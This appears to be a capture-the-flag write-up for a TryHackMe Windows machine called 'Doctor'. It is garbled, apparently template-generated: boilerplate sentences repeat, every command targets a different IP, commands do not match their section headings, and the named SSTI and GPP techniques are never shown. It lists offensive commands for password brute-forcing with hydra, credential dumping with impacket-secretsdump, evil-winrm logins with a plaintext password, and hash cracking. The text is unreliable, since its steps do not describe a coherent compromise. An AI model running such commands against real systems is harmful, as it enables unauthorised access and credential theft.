---
TitleSEO: "TryHackMe — Doctor (Medium Windows) | ZureFX"
TitlePost: "TryHackMe — Doctor (Medium Windows)"
Author: "ZureFX"
Description: "Full writeup for TryHackMe Doctor. SSTI and GPP Password to achieve medium compromise on Windows."
Keywords: "active directory, pwntilldawn, linux, windows, forensics, reversing"
URL: "https://zurefx.github.io/writeups/htb-doctor-372.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-doctor-372/"
Date: "2026-02-28"
Tags: "Active Directory, PwnTillDawn, Linux, Windows, Forensics, Reversing"
Section: "writeups"
Lang: "en"
main_img: "htb-doctor-372"
Permalink: "/writeups/htb-doctor-372.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Doctor** is rated **Medium** on TryHackMe. It runs **Windows** and the IP address during this analysis was `10.52.96.100`.

### Objectives

The service account had excessive permissions assigned in Active Directory. Lateral movement was facilitated by reusing discovered credentials across services.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.103.242.77 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.47.148.199 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Command injection was possible through unsanitized user input in the search functionality. Initial enumeration revealed several interesting open ports on the target.

### Service Enumeration

The service account had excessive permissions assigned in Active Directory. The kernel version was outdated and vulnerable to a publicly known exploit. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.49.122.169
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.85.96.31/FUZZ
```

Token impersonation allowed elevation to SYSTEM privileges on the target. The service account had excessive permissions assigned in Active Directory.

### SMB Enumeration

Initial enumeration revealed several interesting open ports on the target. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
feroxbuster -h
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
nmap -sCV -p53,464,8080 10.84.61.145 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.114.3.231
```

Lateral movement was facilitated by reusing discovered credentials across services. Post-exploitation enumeration revealed a path to domain administrator privileges. The service account had excessive permissions assigned in Active Directory.

## Exploitation

### Vulnerability Identification

Network traffic analysis revealed unencrypted communications containing user credentials. Lateral movement was facilitated by reusing discovered credentials across services. Command injection was possible through unsanitized user input in the search functionality.

Key finding: **SSTI**.

The service was running without proper input validation, leading to injection vulnerabilities. Authentication bypass was achieved through careful manipulation of the login mechanism.

### Initial Access

Command injection was possible through unsanitized user input in the search functionality. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.90.162.243 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The scheduled task ran with elevated privileges and could be abused for escalation. Token impersonation allowed elevation to SYSTEM privileges on the target. Lateral movement was facilitated by reusing discovered credentials across services.

## Privilege Escalation

### Enumeration

Group Policy Preferences contained encrypted but recoverable credentials. Lateral movement was facilitated by reusing discovered credentials across services. Command injection was possible through unsanitized user input in the search functionality.

```powershell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.30.163.237/FUZZ
evil-winrm -i 10.115.18.31 -u administrator -p 'P@ssw0rd!'
```

### Exploitation

Lateral movement was facilitated by reusing discovered credentials across services. The kernel version was outdated and vulnerable to a publicly known exploit.

```powershell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.100.194.121/FUZZ
gobuster dir -u http://10.109.142.71/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
gobuster dir -u http://10.61.119.124/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Initial enumeration revealed several interesting open ports on the target. The service was running without proper input validation, leading to injection vulnerabilities.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Token impersonation allowed elevation to SYSTEM privileges on the target. Unconstrained delegation was enabled on the compromised machine.

## Summary

### Tools Used

- `hydra`
- `dcomexec`
- `GetNPUsers`
- `lookupsid`
- `hashcat`
- `atexec`
- `wmiexec`

### Key Takeaways

- SSTI
- GPP Password
- Remote Code Execution
- Cron Job
